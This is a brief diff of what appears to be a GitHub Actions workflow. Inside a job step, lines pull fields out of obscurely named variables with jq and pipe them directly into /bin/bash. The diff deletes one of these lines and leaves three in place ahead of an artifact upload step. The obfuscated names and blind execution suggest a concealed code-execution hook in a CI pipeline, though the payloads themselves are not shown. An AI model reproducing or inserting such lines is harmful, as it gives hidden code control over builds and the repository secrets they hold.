@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$gli39082" | jq -r .ogv70 | /bin/bash
           echo $z23 | jq -r .xhs04 | /bin/bash
           printf '%s' "$igasf2609" | jq -r .byt13 | /bin/bash
-          echo $fhxat1 | jq -r .ky8268 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
